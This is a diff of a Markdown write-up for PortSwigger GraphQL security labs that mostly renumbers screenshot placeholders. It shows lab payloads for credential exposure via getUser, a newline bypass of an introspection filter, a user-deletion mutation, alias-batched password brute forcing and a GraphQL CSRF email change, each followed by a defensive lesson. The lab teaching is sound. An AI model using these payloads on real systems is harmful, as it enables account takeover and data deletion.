@@ -50,14 +50,18 @@ query($id: Int!) {
 }
 ```
 
-5. Submit the returned `postPassword`.
-
-> **Picture goes here (#2).** Introspection revealing `postPassword`, then the value for id 3.
+> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `query($id: Int!) {`.
 > _Save as_ `images/portswigger-graphql-labs/2.png` _then replace this block with_ `![Lab 1 — Accessing private GraphQL posts](/images/portswigger-graphql-labs/2.png)`_._
 
+
+5. Submit the returned `postPassword`.
+
+> **Picture goes here (#3).** Introspection revealing `postPassword`, then the value for id 3.
+> _Save as_ `images/portswigger-graphql-labs/3.png` _then replace this block with_ `![Lab 1 — Accessing private GraphQL posts](/images/portswigger-graphql-labs/3.png)`_._
+
 ## Lab 2 — Accidental exposure of private GraphQL fields
-> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `getUser`.
-> _Save as_ `images/portswigger-graphql-labs/3.png` _then replace this block with_ `![Lab 2 — Accidental exposure of private GraphQL fields](/images/portswigger-graphql-labs/3.png)`_._
+> **Picture goes here (#4).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `getUser`.
+> _Save as_ `images/portswigger-graphql-labs/4.png` _then replace this block with_ `![Lab 2 — Accidental exposure of private GraphQL fields](/images/portswigger-graphql-labs/4.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -69,14 +73,14 @@ query($id: Int!) {
 4. Send `getUser` to Repeater and iterate the `id` variable — `id: 1` returns the administrator's credentials.
 5. Log in as administrator, open the Admin panel, and delete `carlos`.
 
-> **Picture goes here (#4).** The `getUser` query returning the admin username and password.
-> _Save as_ `images/portswigger-graphql-labs/4.png` _then replace this block with_ `![Lab 2 — Accidental exposure of private GraphQL fields](/images/portswigger-graphql-labs/4.png)`_._
+> **Picture goes here (#5).** The `getUser` query returning the admin username and password.
+> _Save as_ `images/portswigger-graphql-labs/5.png` _then replace this block with_ `![Lab 2 — Accidental exposure of private GraphQL fields](/images/portswigger-graphql-labs/5.png)`_._
 
 **Lesson:** GraphQL resolvers must enforce field-level authorization. Returning sensitive fields because the schema exposes them is a classic "accidental exposure" bug.
 
 ## Lab 3 — Finding a hidden GraphQL endpoint
-> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `/api?query=query{__typename}`.
-> _Save as_ `images/portswigger-graphql-labs/5.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/5.png)`_._
+> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `/api?query=query{__typename}`.
+> _Save as_ `images/portswigger-graphql-labs/6.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/6.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -89,11 +93,19 @@ query($id: Int!) {
 /api?query=query{__typename}
 ```
 
+> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `/api?query=query{__typename}`.
+> _Save as_ `images/portswigger-graphql-labs/7.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/7.png)`_._
+
+
 Response:
 
 ```json
 { "data": { "__typename": "query" } }
 ```
+
+> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `{ "data": { "__typename": "query" } }`.
+> _Save as_ `images/portswigger-graphql-labs/8.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/8.png)`_._
+
 
 3. Run introspection via `?query=...`; it is **disallowed**. The server is filtering queries matching the regex `__schema{`.
 4. Bypass it by inserting a **newline** after `__schema` so the regex no longer matches:
@@ -101,6 +113,10 @@ Response:
 ```text
 /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B ...
 ```
+
+> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B ...`.
+> _Save as_ `images/portswigger-graphql-labs/9.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/9.png)`_._
+
 
 Introspection now succeeds.
 5. Save queries to the site map. Find `getUser` (iterate `id` to find `carlos` = 3) and the **`deleteOrganizationUser`** mutation.
@@ -110,14 +126,18 @@ Introspection now succeeds.
 /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
 ```
 
-> **Picture goes here (#6).** The newline introspection bypass and the `deleteOrganizationUser` mutation.
-> _Save as_ `images/portswigger-graphql-labs/6.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/6.png)`_._
+> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%0`.
+> _Save as_ `images/portswigger-graphql-labs/10.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/10.png)`_._
+
+
+> **Picture goes here (#11).** The newline introspection bypass and the `deleteOrganizationUser` mutation.
+> _Save as_ `images/portswigger-graphql-labs/11.png` _then replace this block with_ `![Lab 3 — Finding a hidden GraphQL endpoint](/images/portswigger-graphql-labs/11.png)`_._
 
 **Lesson:** blocking `__schema{` with a regex is trivially bypassed by whitespace. Disable introspection properly if it isn't needed.
 
 ## Lab 4 — Bypassing GraphQL brute force protections
-> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `mutation {`.
-> _Save as_ `images/portswigger-graphql-labs/7.png` _then replace this block with_ `![Lab 4 — Bypassing GraphQL brute force protections](/images/portswigger-graphql-labs/7.png)`_._
+> **Picture goes here (#12).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `mutation {`.
+> _Save as_ `images/portswigger-graphql-labs/12.png` _then replace this block with_ `![Lab 4 — Bypassing GraphQL brute force protections](/images/portswigger-graphql-labs/12.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -137,17 +157,21 @@ mutation {
 }
 ```
 
+> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `mutation {`.
+> _Save as_ `images/portswigger-graphql-labs/13.png` _then replace this block with_ `![Lab 4 — Bypassing GraphQL brute force protections](/images/portswigger-graphql-labs/13.png)`_._
+
+
 3. Send it. The response contains each attempt's `success` flag; search for `true` to find the valid password.
 4. Log in as `carlos`.
 
-> **Picture goes here (#8).** The aliased mutation batch and the single `success: true` result.
-> _Save as_ `images/portswigger-graphql-labs/8.png` _then replace this block with_ `![Lab 4 — Bypassing GraphQL brute force protections](/images/portswigger-graphql-labs/8.png)`_._
+> **Picture goes here (#14).** The aliased mutation batch and the single `success: true` result.
+> _Save as_ `images/portswigger-graphql-labs/14.png` _then replace this block with_ `![Lab 4 — Bypassing GraphQL brute force protections](/images/portswigger-graphql-labs/14.png)`_._
 
 **Lesson:** rate-limit by **operation cost / resolved fields**, not by HTTP request count; disable or limit aliasing and query batching where not needed.
 
 ## Lab 5 — Performing CSRF via a GraphQL endpoint
-> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++chang`.
-> _Save as_ `images/portswigger-graphql-labs/9.png` _then replace this block with_ `![Lab 5 — Performing CSRF via a GraphQL endpoint](/images/portswigger-graphql-labs/9.png)`_._
+> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++chang`.
+> _Save as_ `images/portswigger-graphql-labs/15.png` _then replace this block with_ `![Lab 5 — Performing CSRF via a GraphQL endpoint](/images/portswigger-graphql-labs/15.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -163,10 +187,14 @@ The GraphQL endpoint accepts form-encoded `POST` requests and relies on cookies 
 query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
 ```
 
+> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++chang`.
+> _Save as_ `images/portswigger-graphql-labs/16.png` _then replace this block with_ `![Lab 5 — Performing CSRF via a GraphQL endpoint](/images/portswigger-graphql-labs/16.png)`_._
+
+
 4. Use **Engagement tools → Generate CSRF PoC**, change the target email in the HTML, and deliver it to the victim from the exploit server.
 
-> **Picture goes here (#10).** The form-encoded GraphQL mutation and the generated CSRF PoC.
-> _Save as_ `images/portswigger-graphql-labs/10.png` _then replace this block with_ `![Lab 5 — Performing CSRF via a GraphQL endpoint](/images/portswigger-graphql-labs/10.png)`_._
+> **Picture goes here (#17).** The form-encoded GraphQL mutation and the generated CSRF PoC.
+> _Save as_ `images/portswigger-graphql-labs/17.png` _then replace this block with_ `![Lab 5 — Performing CSRF via a GraphQL endpoint](/images/portswigger-graphql-labs/17.png)`_._
 
 **Lesson:** GraphQL is not exempt from CSRF. Require a CSRF token or a non-cookie auth mechanism (e.g. `Authorization` header), and reject `application/x-www-form-urlencoded` for GraphQL.
 
